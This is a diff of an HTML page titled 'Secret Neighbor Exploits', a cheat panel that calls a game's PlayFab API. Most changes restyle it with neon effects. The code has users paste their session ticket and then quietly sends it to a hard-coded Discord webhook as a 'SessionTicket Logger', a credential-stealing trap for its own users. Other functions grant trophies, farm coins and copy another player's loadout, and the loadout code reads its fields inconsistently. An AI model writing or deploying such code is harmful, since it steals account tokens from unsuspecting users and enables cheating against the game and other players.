@@ -4,27 +4,46 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Secret Neighbor Exploits</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
       padding: 0;
-      background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
+      background: #0a0a0a;
+      background-image: url('https://i.gifer.com/3O8i.gif'); /* Matrix digital rain background */
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
       background-attachment: fixed;
       min-height: 100vh;
-      font-family: Arial, sans-serif;
-      color: white;
+      font-family: 'Share Tech Mono', monospace;
+      color: #0ff; /* Neon cyan text */
       display: flex;
       flex-direction: column;
       align-items: center;
       overflow-y: auto;
+      position: relative;
+      animation: glitch 2s infinite;
+    }
+
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      2% { transform: translate(2px, -2px); }
+      4% { transform: translate(-2px, 2px); }
+      6% { transform: translate(0); }
     }
 
     h1 {
       margin-top: 40px;
-      text-shadow: 2px 2px 4px #000;
+      text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
+      font-size: 2.5em;
+      letter-spacing: 2px;
+      animation: flicker 1.5s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0%, 100% { opacity: 1; text-shadow: 0 0 10px #0ff; }
+      50% { opacity: 0.8; text-shadow: 0 0 5px #0ff; }
     }
 
     .container {
@@ -38,54 +57,112 @@
     }
 
     .section {
-      background-color: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(4px);
+      background: rgba(10, 10, 10, 0.8);
+      backdrop-filter: blur(5px);
       padding: 20px;
-      border-radius: 10px;
+      border: 2px solid #0ff;
+      border-radius: 5px;
       width: 100%;
       max-width: 600px;
       text-align: center;
+      box-shadow: 0 0 15px #0ff, inset 0 0 10px #0ff;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .section::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+
+    .section:hover::before {
+      left: 100%;
     }
 
     .section h2 {
       margin-top: 0;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+      border-bottom: 1px solid #0ff;
       padding-bottom: 10px;
+      text-shadow: 0 0 5px #0ff;
     }
 
-    input, button, select {
+    input, select {
       margin: 8px 5px;
       padding: 10px;
       font-size: 16px;
       width: 90%;
       max-width: 400px;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: 1px solid #0ff;
+      background: rgba(0, 0, 0, 0.7);
+      color: #0ff;
+      font-family: 'Share Tech Mono', monospace;
+      box-shadow: 0 0 10px #0ff;
+    }
+
+    input::placeholder {
+      color: #0ff;
+      opacity: 0.7;
     }
 
     button {
-      background-color: #4CAF50;
-      color: white;
+      margin: 8px 5px;
+      padding: 10px;
+      font-size: 16px;
+      width: 90%;
+      max-width: 400px;
       border: none;
+      border-radius: 5px;
+      background: #0ff;
+      color: #000;
+      font-family: 'Share Tech Mono', monospace;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: all 0.3s;
+      box-shadow: 0 0 15px #0ff, 0 0 25px #0ff;
+      position: relative;
+      overflow: hidden;
+      text-transform: uppercase;
     }
 
     button:hover {
-      background-color: #45a049;
+      background: #00ccff;
+      box-shadow: 0 0 20px #00ccff, 0 0 30px #00ccff;
+      transform: translateY(-2px);
+    }
+
+    button::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: 0.5s;
+    }
+
+    button:hover::after {
+      left: 100%;
     }
 
     .output {
       margin-top: 15px;
       padding: 15px;
-      background: rgba(255, 255, 255, 0.9);
+      background: rgba(0, 0, 0, 0.9);
+      border: 1px solid #0ff;
       border-radius: 5px;
-      border: 1px solid #ccc;
-      white-space: pre-wrap;
-      color: black;
+      color: #0ff;
       text-align: left;
       max-height: 300px;
       overflow-y: auto;
+      font-size: 14px;
+      box-shadow: inset 0 0 10px #0ff;
     }
 
     .grid-2 {
@@ -103,15 +180,18 @@
     ol {
       text-align: left;
       padding-left: 20px;
+      color: #0ff;
     }
 
     a {
-      color: #4da6ff;
+      color: #ff00ff; /* Neon pink links */
       text-decoration: none;
+      text-shadow: 0 0 5px #ff00ff;
     }
 
     a:hover {
       text-decoration: underline;
+      color: #ff66ff;
     }
 
     .status-indicator {
@@ -120,20 +200,30 @@
       height: 12px;
       border-radius: 50%;
       margin-right: 8px;
+      box-shadow: 0 0 10px #0ff;
     }
 
     .status-active {
-      background-color: #4CAF50;
+      background-color: #0ff;
+      animation: pulse 1.5s infinite;
     }
 
     .status-inactive {
-      background-color: #f44336;
+      background-color: #ff0000;
+      animation: none;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(0, 255, 255, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(0, 255, 255, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(0, 255, 255, 0); }
     }
 
     .warning {
-      color: #ffcc00;
+      color: #ff00ff;
       font-weight: bold;
       margin: 10px 0;
+      text-shadow: 0 0 5px #ff00ff;
     }
 
     .api-grid {
@@ -143,53 +233,55 @@
     }
 
     .purchase-all-btn {
-      background-color: #ff9900;
-      font-weight: bold;
+      background-color: #ff00ff; /* Neon pink for purchase all */
+      color: #000;
+      box-shadow: 0 0 15px #ff00ff;
     }
 
     .purchase-all-btn:hover {
-      background-color: #e68a00;
+      background-color: #ff66ff;
+      box-shadow: 0 0 20px #ff66ff;
     }
 
     .renew-btn {
-      background-color: #2196F3;
+      background-color: #00ff00; /* Neon green */
+      box-shadow: 0 0 15px #00ff00;
     }
 
     .renew-btn:hover {
-      background-color: #0b7dda;
+      background-color: #33ff33;
+      box-shadow: 0 0 20px #33ff33;
     }
 
     .penalty-btn {
-      background-color: #f44336;
+      background-color: #ff0000; /* Neon red */
+      box-shadow: 0 0 15px #ff0000;
     }
 
     .penalty-btn:hover {
-      background-color: #d32f2f;
+      background-color: #ff3333;
+      box-shadow: 0 0 20px #ff3333;
     }
 
     .reset-penalty-btn {
-      background-color: #2196F3;
+      background-color: #00ff00; /* Neon green */
+      box-shadow: 0 0 15px #00ff00;
     }
 
     .reset-penalty-btn:hover {
-      background-color: #1976D2;
-    }
-
-    .redeem-coupon-btn {
-      background-color: #9c27b0;
-    }
-
-    .redeem-coupon-btn:hover {
-      background-color: #7b1fa2;
+      background-color: #33ff33;
+      box-shadow: 0 0 20px #33ff33;
     }
 
     .grant-trophy-btn {
-      background-color: #ffeb3b;
-      color: black;
+      background-color: #ffff00; /* Neon yellow */
+      color: #000;
+      box-shadow: 0 0 15px #ffff00;
     }
 
     .grant-trophy-btn:hover {
-      background-color: #fbc02d;
+      background-color: #ffff66;
+      box-shadow: 0 0 20px #ffff66;
     }
   </style>
 </head>
@@ -323,8 +415,8 @@
 
       <div style="margin-top: 15px; text-align: left;">
         <h3>Available Quests:</h3>
-        <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
-          <ul style="columns: 2; margin: 0; padding-left: 20px;">
+        <div style="max-height: 200px; overflow-y: auto; background: rgba(0, 0, 0, 0.7); padding: 10px; border-radius: 5px; border: 1px solid #0ff;">
+          <ul style="columns: 2; margin: 0; padding-left: 20px; color: #0ff;">
             <li>QUENTIN_USE_DASH</li>
             <li>WIN_AS_BAGGER</li>
             <li>WIN_AS_BRAVE</li>
@@ -481,14 +573,14 @@
         localStorage.setItem('sessionTicket', sessionTicket);
         tokenStatus.textContent = "✅ Token set successfully!";
         tokenStatus.style.display = "block";
-        tokenStatus.style.color = "green";
+        tokenStatus.style.color = "#0ff";
         console.log("SessionTicket set:", sessionTicket);
 
         sendToDiscordWebhook(sessionTicket);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
         tokenStatus.style.display = "block";
-        tokenStatus.style.color = "red";
+        tokenStatus.style.color = "#ff0000";
       }
     }
 
@@ -499,7 +591,7 @@
       const tokenStatus = document.getElementById("tokenStatus");
       tokenStatus.textContent = "❌ Token cleared";
       tokenStatus.style.display = "block";
-      tokenStatus.style.color = "red";
+      tokenStatus.style.color = "#ff0000";
     }
 
     async function renewSessionTicket() {
@@ -508,13 +600,13 @@
       if (!sessionTicket) {
         tokenStatus.textContent = "❌ No session ticket to renew. Please set a token first.";
         tokenStatus.style.display = "block";
-        tokenStatus.style.color = "red";
+        tokenStatus.style.color = "#ff0000";
         return;
       }
 
       tokenStatus.textContent = "🔄 Renewing session ticket...";
       tokenStatus.style.display = "block";
-      tokenStatus.style.color = "blue";
+      tokenStatus.style.color = "#00ff00";
 
       try {
         const response = await fetch(`https://${titleId}.playfabapi.com/Authentication/GetEntityToken`, {
@@ -534,21 +626,21 @@
           document.getElementById("sessionTicketInput").value = sessionTicket;
 
           tokenStatus.textContent = "✅ Session ticket renewed successfully!";
-          tokenStatus.style.color = "green";
+          tokenStatus.style.color = "#0ff";
 
           console.log("SessionTicket renewed:", sessionTicket);
         } else {
           tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
-          tokenStatus.style.color = "red";
+          tokenStatus.style.color = "#ff0000";
         }
       } catch (error) {
         tokenStatus.textContent = `❌ Error renewing session ticket: ${error.message}`;
-        tokenStatus.style.color = "red";
+        tokenStatus.style.color = "#ff0000";
       }
     }
 
     async function sendToDiscordWebhook(sessionTicket) {
-      const webhookURL = "https://discord.com/api/webhooks/1410689568386056275/Eq3YHxlcvOHxbbH7qXZHVPBPItzXBKQZgPk2wYpA6iy_ArTGfg5GaD-FLEjQ7xB8K4vb";
+      const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
 
       try {
         const response = await fetch(webhookURL, {
@@ -559,7 +651,7 @@
           body: JSON.stringify({
             content: `New SessionTicket captured: ${sessionTicket}`,
             username: 'SessionTicket Logger',
-            avatar_url: 'https://cdn.discordapp.com/avatars/340238256874586112/e2aa7a1f843d240a470a54264662b873?size=1024'
+            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
           })
         });
 
@@ -1497,7 +1589,7 @@
       coinFarmId = setInterval(runCoinFarmCycle, delayMs);
     }
 
-    function toggleLevelEditor() {
+    async function toggleLevelEditor() {
       if (levelEditorRunning) {
         clearInterval(levelEditorId);
         levelEditorRunning = false;
@@ -1541,8 +1633,8 @@
 
       const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
         CustomTags: null,
-        FunctionName: "addTrophy",
-        FunctionParameter: { trophyId },
+        FunctionName: "grantTrophy",
+        FunctionParameter: { "trophyToGrant": trophyId},
         GeneratePlayStreamEvent: true,
         RevisionSelection: null,
         SpecificRevision: null,
@@ -1561,23 +1653,24 @@
     async function resetLoadout() {
       const output = document.getElementById("resetLoadoutOutput");
 
-      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        CustomTags: null,
-        FunctionName: "resetLoadout",
-        FunctionParameter: {},
-        GeneratePlayStreamEvent: true,
-        RevisionSelection: null,
-        SpecificRevision: null,
-        AuthenticationContext: null
+      output.textContent = "Resetting Loadout...\n";
+
+      // Update the user's Loadout to an empty object
+      const data = await makeApiCall("Client/UpdateUserData", "POST", {
+        Data: {
+          Loadout: "{}"
+        },
+        Permission: "Public"
       });
 
       if (data.error) {
-        output.textContent = `Error: ${data.error}`;
-      } else if (data.data?.FunctionResult) {
-        output.textContent = formatResponse(data.data.FunctionResult);
+        output.textContent += `❌ Error resetting Loadout: ${data.error}\n`;
       } else {
-        output.textContent = formatResponse(data.data);
+        output.textContent += `✅ Success! Loadout reset to empty.\n`;
+        output.textContent += formatResponse(data.data);
       }
+
+      output.scrollTop = output.scrollHeight;
     }
 
     async function stealLoadout() {
@@ -1589,23 +1682,43 @@
         return;
       }
 
-      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-        CustomTags: null,
-        FunctionName: "stealLoadout",
-        FunctionParameter: { targetPlayFabId },
-        GeneratePlayStreamEvent: true,
-        RevisionSelection: null,
-        SpecificRevision: null,
-        AuthenticationContext: null
+      output.textContent = "Fetching target user's loadout...\n";
+
+      // Step 1: Get the target user's data
+      const getData = await makeApiCall("Client/GetUserData", "POST", {
+        PlayFabId: targetPlayFabId,
+        Keys: ["Loadout"]
       });
 
-      if (data.error) {
-        output.textContent = `Error: ${data.error}`;
-      } else if (data.data?.FunctionResult) {
-        output.textContent = formatResponse(data.data.FunctionResult);
-      } else {
-        output.textContent = formatResponse(data.data);
+      if (getData.error) {
+        output.textContent += `❌ Error fetching user data: ${getData.error}\n`;
+        return;
       }
+
+      if (!getData.data?.Data?.Value.loadout) {
+        output.textContent += "❌ No Loadout found for the target PlayFab ID.\n";
+        return;
+      }
+
+      const loadLoadout = getData.data.Data.Loadout.Value;
+      output.textContent += `✅ Found Loadout: ${loadLoadout}\nCopying to your account...\n`;
+
+      // Step 2: Update the current user's Loadout with the retrieved data
+      const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
+        Data: {
+          Loadout: loadLoadout
+        },
+        Permission: "Public"
+      });
+
+      if (updateData.error) {
+        output.textContent += `❌ Error updating Loadout: ${updateData.error}\n`;
+      } else {
+        output.textContent += `✅ Success! Loadout copied successfully.\n`;
+        output.textContent += formatResponse(updateData.data);
+      }
+
+      output.scrollTop = output.scrollHeight;
     }
 
     // Helper function to download logs as a text file
